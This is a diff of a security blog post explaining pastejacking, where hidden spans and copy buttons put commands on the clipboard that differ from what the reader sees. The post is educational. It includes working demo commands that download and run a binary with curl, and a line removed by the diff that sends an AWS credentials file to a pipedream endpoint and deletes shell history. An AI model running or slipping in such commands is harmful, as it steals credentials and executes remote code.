@@ -4,9 +4,9 @@ emoji: 🗒️
 asset: "/assets/posts/dont-trust-your-clipboard"
 ---
 
-At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It's common to copy code from various online sources such as tutorials, Stack Overflow posts, READMEs, gists, blogs, and the like. Just as hackers exploit our desensitization to opening emails and clicking on links, programmers can also become accustomed to the potential risks of copying and pasting code into their terminals, which can also lead to severe consequences.
+At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It's common to copy code from various online sources everyday without a second thought, however, just as hackers exploit our desensitization to opening emails and clicking on links, programmers can also become accustomed to the potential risks of copying and pasting code into their terminals.
 
-This post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution, as there may be risks involved. Later on, we will delve into the reasons why I felt the need to include this disclaimer.
+Before warned, this post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution.
 
 One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by `frankbi`.
 
@@ -16,7 +16,7 @@ One of my favorite examples of why you should exercise caution when running copy
     <img style="max-width: 75%;" src="{{ page.asset }}/rickroll.gif"/>
 </div>
 
-Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your system is something that should make you uneasy. Many project installation instructions are now utilizing similar commands such as `curl -L https://example.com/script.sh | bash` or `bash -c $(curl 0fsSL https://example.com/script.sh)`. A prominent example of this is Homebrew.
+Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your system is something that should make you uneasy. Many project installation instructions are now utilizing similar commands such as `curl -L https://example.com/script.sh | bash` or `bash -c $(curl -fsSL https://example.com/script.sh)`. A prominent example of this is Homebrew.
 
 #### [Install Homebrew - brew.sh](https://brew.sh/)
 <div style="text-align: center;">
@@ -37,8 +37,6 @@ The copy button purpose is to save you the backbreaking task of highlighting and
 
 #### [pyenv/pyenv README| github.com](https://github.com/pyenv/pyenv)
 
-Github injects a copy button for all code block in READMEs.
-
 <div style="text-align: center;">
     <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_github_readme.png">
 </div>
@@ -52,7 +50,6 @@ The examples above are not inherently harmful, but they lead individuals to trus
   <h3>Welcome to totally-safe-and-helpful.blog</h3>
   <h5>By BadActor666</h5>
   <p>Today we are going to give you a couple of useful docker commands. Lets jump right into it! You can copy all the commands into your terminal using the handy copy button!</p>
-  <div>Remove all images</div>
   <table>
     <td style="vertical-align: middle; width: 100%">
       <div class="code nocopy">docker rmi $(docker images -a -q)</div>
@@ -109,7 +106,7 @@ This is what is copied to the clipboard when the copy button is clicked:
 curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n
 ```
 
-Using `select()` plus `execCommand()` is the way most copy buttons on webpage work, just instead of adding a dummy element, they select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.
+Using `select()` plus `execCommand()` is the way most copy buttons work, just instead of adding a dummy element, they select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.
 
 ## Select, Copy & Paste
 
@@ -154,7 +151,7 @@ This time `BadActor666` used a `<span>` tag inside of a `<div>`. A `<span>` tag 
 <p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
 ```
 
-This allows us to add style to text, but browser allows the copy without the the format applied. The BadActor666 `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left conner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
+This allows us to add style to text, but the browser allows the copy without the the format applied. The BadActor666 `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left corner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
 
 ```
 du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
@@ -167,7 +164,7 @@ The curl downloads a file, makes it executable, runs it.
 
 ### Attack Avenue 1
 
-The `sudo` command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run as the root user.  When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`.
+The sudo command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run with elevated privilege.  When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`.
 
 ```
 nick /home $ sudo apt-get install apache2
@@ -191,11 +188,6 @@ AWS credentials are stored in plaintext and is owned by the current user `~/.aws
 To demonstrate this we are going to use RequestBin. RequestBin is a web-based tool that allows you to inspect and debug HTTP requests. It provides a unique URL that you can use to send HTTP requests to, and then allows you to inspect the request in real-time. 
 
 For this exercise there is AWS creds for the `james007` is located in `~/.aws/credentials-fake`. And James found the following from totally-safe-and-helpful.blog.
-
-
-<!-- curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null; top; exit-->
-<!-- history -d -10--1 -->
-<!-- https://requestbin.com/r/envbrzdr9hp9 -->
 
 <div id="totallysafeandhelpful">
   <table>
@@ -238,20 +230,20 @@ This is lower the chance of the end user noticing something is a miss. The ony i
 
 There are some subtleties to this commands that we should explore. 
 
-Notice the space between the $ prompt and the command itself. This will prevent the command from being saved to your bash history. This means that the command will send the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the 
+Notice the space between the $ prompt and the command itself. This will prevent the command from being saved to your bash history ([See HISTCONTROL](https://ss64.com/bash/history.html)). This means that the command will send the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the 
 
 <div style="text-align: center;">
-<video style="max-width: 90%;"  controls>
+<video style="max-width: 85%;"  controls>
   <source src="{{ page.asset }}/steal-aws-creds.webm">
   Your browser does not support HTML video.
 </video>
 </div>
 
 
-## Conclusion  
+## Where do we go from here? 
 
-When you use someone else's code or access a website, you are placing trust in them to ensure the security of their code and prevent unauthorized modifications. This is why I added the disclaimer. Do you know how strong my password is for my github? Do you know if I have MFA setup for my account? Do you know if I have given someone else access to the repo? 
+To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.
 
 Another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repose and other resources be in some type of artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 
 
-Where do we go from here? To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.
+Sharing code is amazing, but just like everything else be safe, be responsible, and be smart. 
